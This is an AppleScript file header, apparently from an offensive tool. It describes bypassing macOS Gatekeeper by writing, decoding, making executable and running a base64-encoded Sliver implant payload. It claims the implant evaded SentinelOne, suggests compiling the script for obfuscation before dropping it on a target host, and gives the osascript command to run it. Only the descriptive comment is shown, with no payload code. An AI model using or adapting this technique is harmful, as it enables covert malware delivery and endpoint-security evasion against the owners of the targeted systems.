(* This Applescript is intended to bypass Mac OSX Gatekeeper and can be launched in a Mac OSX commandline using 'osascript'.
It takes a base64 encoded Sliver payload (compiled for Mac of course), writes it to a file, decodes it into a binary
performs chmod +x on the resulting file, then executes the sliver. Tested on Mac OSX Catalina with Gatekeeper and SentinelOne active.
The sliver was not detected or blocked.

This can be run raw as is or for additional obfuscation, you can paste into MacOS Script Editor and saveit as a compiled script object before dropping on the target host. In either case, the command line to run it is:

osascript <filename>

Modify filenames and such to match your purpose/pretext. *)
